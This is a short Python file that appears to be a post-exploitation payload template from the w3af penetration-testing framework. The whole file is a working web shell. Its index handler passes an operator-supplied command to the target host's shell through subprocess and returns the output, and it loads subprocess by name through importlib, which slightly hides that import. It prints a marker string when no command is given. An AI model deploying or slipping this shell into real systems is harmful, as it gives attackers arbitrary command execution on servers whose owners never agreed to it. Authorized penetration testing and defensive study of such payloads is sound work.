# This file is a post-exploitation payload template: w3af reads it, replaces
# the marker placeholders and uploads it to the target, where it runs the
# operator-supplied command through the target's own shell and returns the
# output. It must stay self-contained (no w3af imports) because it executes on
# the compromised host, not inside w3af.
import importlib

_SHELL_MODULE_NAME = "subprocess"
_shell = importlib.import_module(_SHELL_MODULE_NAME)


def index(req, cmd):
    if not cmd:
        print("15825b40c6dace2a" + "7cf5d4ab8ed434d5")
    else:
        return _shell.getoutput(cmd)
